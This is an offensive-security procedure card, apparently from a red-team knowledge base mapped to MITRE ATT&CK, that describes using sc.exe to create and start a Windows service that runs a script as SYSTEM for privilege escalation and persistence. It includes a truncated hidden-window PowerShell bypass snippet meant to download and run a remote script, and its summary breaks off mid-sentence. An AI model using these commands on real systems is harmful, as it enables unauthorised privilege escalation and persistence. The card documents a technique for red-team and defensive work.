---
id: d50d18ce-c21c-4aa6-902c-29900c770791
name: Create and Run a Windows Service as SYSTEM (Administrator)
type: procedure
verified: false
submitted: false
created_at: '2020-04-28T21:10:21.136000+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[New Service|T1050 - New Service]]'
platforms:
- Windows
tags:
- '[[administrator]]'
- '[[persistence]]'
commands:
- '[[Create a Windows Service]]'
- '[[Delete a Windows Service]]'
- '[[Start a Windows Service]]'
---

# Create and Run a Windows Service as SYSTEM (Administrator)

## Summary

Create a Windows service which executes a script as SYSTEM when started. This procedure does not create a standard Windows service - it uses a simple "hack" which executes a target script or program and will generate error messages since it's not launching a traditional service. The error messages 

## Description

# Description

Create a Windows service which executes a script as SYSTEM when started. This procedure does not create a standard Windows service - it uses a simple "hack" which executes a target script or program and will generate error messages since it's not launching a traditional service. The error messages do not mean the command failed to execute. This is especially useful when attempting to gain SYSTEM privileges after already gaining Administrator rights.



# Instructions

This procedure can execute a program or script. For example, a script that executes a PowerShell command to download and run a script from a remote server





**Code**: [[@ECHO OFF
powershell -ep bypass -windowstyle hidde]]





1. Create a service with the path of the script/program as an argument





**Command** ([[Create a Windows Service]]):

```bash
sc.exe create $_SERVICE_NAME binpath= "$_PATH\$_PROGRAM"
```





2. Run the service





**Command** ([[Start a Windows Service]]):

```bash
sc.exe start $_SERVICE_NAME
```





3. (Optional) Clean up by deleting the service when done





**Command** ([[Delete a Windows Service]]):

```bash
sc.exe delete $_SERVICE_NAME
```





## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[New Service|T1050 - New Service]]

## Commands Used

- [[Create a Windows Service]]
- [[Delete a Windows Service]]
- [[Start a Windows Service]]

## Tags

- [[administrator]]
- [[persistence]]


